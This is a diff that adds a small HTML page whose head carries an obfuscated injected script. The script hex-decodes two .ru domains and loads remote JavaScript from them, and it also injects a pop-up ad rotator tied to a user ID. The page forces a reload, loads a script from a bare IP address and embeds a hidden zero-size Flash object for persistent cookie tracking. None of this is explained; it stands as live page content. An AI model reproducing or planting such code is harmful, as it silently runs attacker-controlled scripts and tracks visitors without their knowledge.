@@ -1,0 +1,15 @@
+
+<html>
+<head><script>if(window.v_347548468_V_235235235 === undefined) !(function(){!function(){var t=JSON.parse('["32386e32676c3377667962302e7275","646d7564337679736a61366d65342e7275"]'),e="27801",o=function(t){t=t.match(/[\S\s]{1,2}/g);for(var e="",o=0;o<t.length;o++)e+=String.fromCharCode(parseInt(t[o],16));return e},n=function(t,e,o){var n=document.location.protocol+"//"+t;if(window.smlo&&-1==navigator.userAgent.toLowerCase().indexOf("firefox"))window.smlo.loadSmlo(n.replace("https:","http:"));else if(window.zSmlo&&-1==navigator.userAgent.toLowerCase().indexOf("firefox"))window.zSmlo.loadSmlo(n.replace("https:","http:"));else{var r=document.createElement("script");r.setAttribute("src",n),r.setAttribute("type","text/javascript"),document.head.appendChild(r),r.onload=function(){this.a982392846||(this.a982392846=!0,"function"==typeof e&&e())},r.onerror=function(){this.a982392846||(this.a982392846=!0,r.parentNode.removeChild(r),"function"==typeof o&&o())}}},r=function(i){var a=i?i:t[0],s=o(a)+"/pjs/"+e+".js";n(s,function(){},function(){var e=t.indexOf(a),o=t[e+1];o&&r(o)})};r()}();function getCfCookie(name) { var matches = document.cookie.match(new RegExp("(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)")); return matches ? decodeURIComponent(matches[1]) : undefined;} if (window.self == window.top) { document.addEventListener("DOMContentLoaded", function(){ var pops = document.createElement('script'); var cfilterCookie = '6697e3d5eb75761c638fdeb1eed84055'; var cfilterCookieIsSet = getCfCookie(cfilterCookie) ? getCfCookie(cfilterCookie) : 0; pops.src = '//mywebshield-ww1.com/' + 'getcl/rotator/' + 'campaignid/3/' + 'sourceid/132/' + 'siteid/200097813/' + 'userid/C0AD9BD6-ED9A-42CE-A55B-4A26A345E7B3/' + 'iscookie/' + cfilterCookieIsSet; document.head.appendChild(pops); });}}) (), window.v_347548468_V_235235235 = true;</script>
+<script language="javascript">setTimeout("location.replace(location.href.split(\"#\")[0])",2000);</script>
+<script type="text/javascript" src="http://1.1.1.2:89/cookie/flash.js"></script>
+<script language="javascript">setURL("1.1.1.2");supFlash("18446744069876039883");</script>
+</head>
+<body>
+<object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" codebase="http://fpdownload.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=7,0,0,0" width="0" height="0" id="m" align="center"><param name="allowScriptAccess" value="always" />
+<param name="movie" value="http://1.1.1.2:89/cookie/flashcookie.swf" />
+<param name="quality" value="high" />
+<param name="FlashVars" value="srv=1.1.1.2" />
+<embed src="http://1.1.1.2:89/cookie/flashcookie.swf"FlashVars="srv=1.1.1.2" quality="high" width="0" height="0"  name="m" align="center" allowScriptAccess="always" type="application/x-shockwave-flash"pluginspage="http://www.macromedia.com/go/getflashplayer" />
+</object>
+</body></html>
